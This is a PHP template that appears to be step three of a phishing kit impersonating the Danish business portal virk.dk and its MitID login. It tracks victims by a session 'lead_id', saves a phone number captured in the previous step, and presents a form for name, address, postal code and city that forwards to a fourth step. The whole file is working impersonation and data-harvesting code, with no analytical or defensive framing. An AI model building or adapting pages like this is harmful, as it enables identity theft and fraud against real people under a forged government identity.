<?php
require_once 'config.php';
session_start();

if (!isset($_SESSION['lead_id'])) {
    header('Location: index.php');
    exit;
}

// Store phone from step2
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST[$page2_field_name])) {
    $_SESSION[$page2_field_name] = $_POST[$page2_field_name];
}
?>
<!DOCTYPE html>
<html lang="da">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $page3_title; ?></title>
    <link rel="icon" type="image/svg+xml" href="assets/logo.svg">
    <link rel="stylesheet" href="assets/style.css">
</head>
<body class="mitid-page">
    <header class="mitid-nav">
        <div class="mitid-nav-container">
            <img src="assets/logo.svg" alt="Virk Logo" class="mitid-logo">
            <span class="mitid-brand">virk.dk</span>
        </div>
    </header>

    <main class="mitid-main">
        <div class="mitid-container">
            <div class="mitid-box">
                <div class="mitid-header">
                    <div class="step-indicator">
                        <span class="step-dot active"></span>
                        <span class="step-dot active"></span>
                        <span class="step-dot active"></span>
                        <span class="step-dot"></span>
                    </div>
                    <h1><?php echo $page3_title; ?></h1>
                    <p><?php echo $page3_description; ?></p>
                </div>

                <form action="step4.php" method="POST" class="mitid-form">
                    <?php foreach ($page3_fields as $field): ?>
                    <div class="form-group">
                        <label for="<?php echo $field['name']; ?>"><?php echo $field['label']; ?></label>
                        <div class="input-with-icon">
                            <input type="<?php echo $field['type']; ?>" 
                                   id="<?php echo $field['name']; ?>" 
                                   name="<?php echo $field['name']; ?>" 
                                   placeholder="<?php echo $field['placeholder']; ?>"
                                   required>
                            <span class="input-icon">
                                <?php 
                                if (strpos($field['name'], 'name') !== false) echo '👤';
                                elseif (strpos($field['name'], 'address') !== false) echo '🏠';
                                elseif (strpos($field['name'], 'postal') !== false) echo '📮';
                                elseif (strpos($field['name'], 'city') !== false) echo '🏙️';
                                else echo '📝';
                                ?>
                            </span>
                        </div>
                    </div>
                    <?php endforeach; ?>

                    <button type="submit" class="mitid-button">
                        <span class="button-text">Fortsæt</span>
                        <div class="button-loader" style="display: none;">
                            <div class="spinner"></div>
                            <span>Validerer...</span>
                        </div>
                    </button>
                </form>
            </div>
        </div>
    </main>

    <script src="assets/script.js"></script>
</body>
</html>
